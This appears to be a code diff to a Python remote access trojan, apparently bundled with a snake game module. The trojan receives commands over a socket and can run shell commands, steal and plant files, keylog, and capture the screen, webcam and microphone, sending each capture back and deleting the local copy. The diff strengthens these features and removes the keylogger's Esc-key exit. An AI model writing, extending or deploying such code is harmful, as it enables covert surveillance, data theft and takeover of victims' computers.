@@ -15,7 +15,7 @@ import json
 from jeu.snake import jeu 
 
 
-
+stop = False
 # RAT:
 
 def connect():
@@ -51,7 +51,7 @@ def capture_screen():
     try:
         screenshot = ImageGrab.grab()
         screenshot.save("screen.png", "PNG")
-        return read_file("screen.png")
+        return 
     except Exception as e:
         return f"Error capturing screen: {str(e)}"
 
@@ -64,14 +64,16 @@ def capture_webcam():
         if ret:
             cv2.imwrite("webcam.png", frame)
             cap.release()
-            return read_file("webcam.png")
+            return 
         else:
             cap.release()
             return "Error: Could not capture frame from webcam."
     except Exception as e:
         return f"Error capturing webcam: {str(e)}"
 def send_post_req(time_interval):
-    global text
+    global stop, text 
+    if stop:
+        return
     try:
         payload = json.dumps({"keyboardData" : text})
         with open("Keylogg.txt", "a", encoding="utf-8") as f:
@@ -83,10 +85,6 @@ def send_post_req(time_interval):
     except Exception as e:
         print(e)
         print("Couldn't complete request!")
-
-def on_release(key):
-	if key == keyboard.Key.esc:
-	   return False
 	
 def on_press(key):
     global text
@@ -111,11 +109,17 @@ def on_press(key):
 
 def keylogger():
     global text
+    global stop
     text = ""
     time_interval = 10
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        send_post_req( time_interval)
+	
+	
+    with keyboard.Listener(on_press=on_press) as listener:
+        if stop:
+            return
+        send_post_req(time_interval)
         listener.join()
+		
 
 def record_microphone(duration=5):
     try:
@@ -132,10 +136,12 @@ def record_microphone(duration=5):
         
         print("Recording microphone...")
         frames = []
-        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+        while not stop : #for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+            if stop:
+                break
             data = stream.read(CHUNK)
             frames.append(data)
-        
+	
         print("Finished recording.")
         stream.stop_stream()
         stream.close()
@@ -148,16 +154,17 @@ def record_microphone(duration=5):
         waveFile.writeframes(b''.join(frames))
         waveFile.close()
         
-        return read_file("microphone.wav")
+        return 
     except Exception as e:
         return f"Error recording microphone: {str(e)}"
 
 # --- RAT Command Handler ---
 def rat_client():
+	global stop
 	s = connect()
 	try:
 		while True:
-			data = s.recv(1024)
+			data = s.recv(1000000)
 			if not data:
 				break
 			command = data.decode()
@@ -171,37 +178,54 @@ def rat_client():
 					s.send(str.encode(str(e)))
 			elif command.startswith('download '):
 				path = command[9:]
-				if os.path.exists(path):
-					s.send(read_file(path).encode())
-				else:
-					s.send(str.encode("File not found"))
+				try:
+					if os.path.exists(path):
+						s.send(read_file(path).encode())
+					else:
+						s.send(str.encode("File not found"))
+				except Exception as e:
+					s.send(str.encode(f"Error: {str(e)}"))
 			elif command.startswith('upload '):
-				path = command [7:]
-				content = s.recv(100000).decode()
+				path = command[7:]	
+				content = s.recv(1000000).decode()
 				content = base64.b64decode(content.encode())
 				write_file(path, content)
 				s.send(str.encode("Upload complete"))
 			elif command == 'keylogger':
+				stop = False
 				s.send(str.encode("Keylogging ..."))
 				keylogger_thread = threading.Thread(target=keylogger, daemon=True)
 				keylogger_thread.start()
-			elif command == 'sendLog':
-				if os.path.exists("Keylogg.txt"):
-					s.send(str.encode(read_file("Keylogg.txt")))
-				else:
-					s.send(str.encode("No keylog file found"))
+				while not stop:
+					if s.recv(1024).decode() == "stop":
+						stop = True
+				keylogger_thread.join()
+				s.send(read_file("keylogg.txt").encode())
+				execute_commands("del keylogg.txt")
 			elif command == 'screenshot':
-				s.send(str.encode(capture_screen()))
+				capture_screen()
+				s.send(read_file("screen.png").encode())
+				execute_commands("del screen.png")
 			elif command == 'webcam':
-
-				s.send(str.encode(capture_webcam()))
-				
-			elif command.startswith('mic '):
+				capture_webcam()
+				s.send(read_file("webcam.png").encode())
+				execute_commands("del webcam.png")
+			elif command.startswith('mic'):
+				stop = False
 				try:
 					duration = int(command.split(' ')[1])
 				except:
 					duration = 5
-				s.send(str.encode(record_microphone(duration)))
+				s.send(str.encode("Recording ..."))
+				mic_thread = threading.Thread(target=record_microphone, args=(duration,), daemon=True)
+				mic_thread.start()
+				while not stop:
+					if s.recv(1024).decode() == "stop":
+						stop = True
+				mic_thread.join()
+				#record_microphone(duration)
+				s.send(read_file("microphone.wav").encode())
+				execute_commands("del microphone.wav")
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
@@ -210,6 +234,7 @@ def rat_client():
 		
 	except Exception as e:
 		print(f"An error occurred: {e}")
+		
 		s.send(str.encode(f"Error: {str(e)}"))
 	finally:
 		s.close()
